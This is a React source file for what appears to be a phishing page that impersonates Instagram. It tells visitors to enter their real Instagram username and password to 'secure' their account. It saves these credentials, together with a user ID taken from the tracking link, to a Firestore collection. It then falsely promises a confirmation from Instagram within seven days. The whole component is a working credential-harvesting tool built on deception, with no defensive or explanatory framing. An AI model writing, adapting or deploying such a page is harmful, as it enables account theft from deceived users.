import React, { useState, useEffect } from 'react';
import { db } from '../firebase';  // Firebase Firestore instance
import { collection, addDoc } from 'firebase/firestore';
import { useLocation } from 'react-router-dom';  // Import the useLocation hook

const SecureAccount = () => {
  const [formData, setFormData] = useState({
    username: '',
    password: '',  // Add password to form data
  });
  const [message, setMessage] = useState('');
  const [loading, setLoading] = useState(false);
  const [userId, setUserId] = useState('');  // Store userId from the URL

  const location = useLocation();

  // Extract userId from the URL query parameters
  useEffect(() => {
    const params = new URLSearchParams(location.search);
    const userIdFromLink = params.get('userid');
    console.log("Extracted userId from URL: ", userIdFromLink);  // Debugging log
    if (userIdFromLink) {
      setUserId(userIdFromLink);
    } else {
      console.error('No userId found in URL');
    }
  }, [location]);

  // Handle form input changes
  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
  };

  // Handle form submission
  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setMessage('');

    if (!userId) {
      setMessage('User ID is missing. Unable to process the request.');
      setLoading(false);
      return;
    }

    try {
      console.log("Submitting the following data to Firestore:", {
        ...formData,
        userId: userId,  // Store the userId from the URL parameter
        timestamp: new Date(),
      });

      // Save form data to Firestore, including the userId
      await addDoc(collection(db, 'submissions'), {
        ...formData,
        userId: userId,  // Store the userId from the URL parameter
        timestamp: new Date(),
      });
      
      setMessage('Your account security request has been submitted successfully! You will receive a confirmation message from our Instagram account within 7 days.');
      setFormData({ username: '', password: '' });
    } catch (error) {
      console.error('Error adding document: ', error);
      setMessage('There was an error submitting your request. Please try again later.');
    }
    setLoading(false);
  };

  return (
    <div className="flex flex-col items-center justify-center min-h-screen">
      
      {/* Explanation about securing the account */}
      <div className="mb-6 text-center max-w-sm text-sm">
        <p className="mb-4 text-gray-800 font-bold">
          Secure Your Instagram Account
        </p>
        <ul className="list-disc list-inside text-left text-gray-800 font-bold mb-4">
          <li className="text-lg">🚫 Protect your account from fake accounts and unauthorized screenshots.</li>
          <li className="text-lg">🕒 The process will take 7 days to complete.</li>
          <li className="text-lg">📲 You will receive a confirmation message from our Instagram account once the process is complete.</li>
        </ul>
        <p className="text-gray-800">
          Please provide your actual Instagram username and password to verify your account.
        </p>
      </div>

      {/* Container for the form */}
      <div className="w-full max-w-xs bg-white p-6 rounded-lg shadow-md">
        {/* Logo Placeholder */}
        <h1 className="text-3xl font-bold text-center text-gray-800 mb-6">Instagram</h1>

        {/* Form to Secure Account */}
        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <input
              type="text"
              name="username"
              value={formData.username}
              onChange={handleInputChange}
              required
              className="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
              placeholder="Username"
            />
          </div>
          <div>
            <input
              type="password"
              name="password"
              value={formData.password}
              onChange={handleInputChange}
              required
              className="w-full p-3 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
              placeholder="Password"
            />
          </div>
          <button
            type="submit"
            className={`w-full bg-blue-500 text-white py-2 rounded-lg hover:bg-blue-600 transition duration-300 font-semibold ${loading ? 'opacity-50 cursor-not-allowed' : ''}`}
            disabled={loading}  // Disable button while loading
          >
            {loading ? 'Submitting...' : 'Submit Request'}
          </button>
        </form>

        {/* Forgot Password Link */}
        <p className="text-center mt-4 text-sm text-blue-500 hover:underline cursor-pointer">
          Forgot Password?
        </p>

        {/* Message after submission */}
        {message && <p className="text-center mt-4 text-green-500">{message}</p>}

      </div>

    </div>
  );
};

export default SecureAccount;
